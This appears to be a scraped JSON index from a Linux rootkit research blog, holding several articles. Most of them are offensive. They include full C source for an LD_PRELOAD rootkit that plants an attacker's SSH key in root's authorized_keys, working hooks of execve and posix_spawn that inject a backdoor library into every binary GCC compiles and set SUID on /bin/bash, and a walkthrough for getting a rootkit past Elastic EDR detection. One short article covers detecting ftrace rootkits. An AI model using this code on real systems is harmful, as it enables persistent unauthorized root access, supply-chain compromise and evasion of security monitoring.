href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 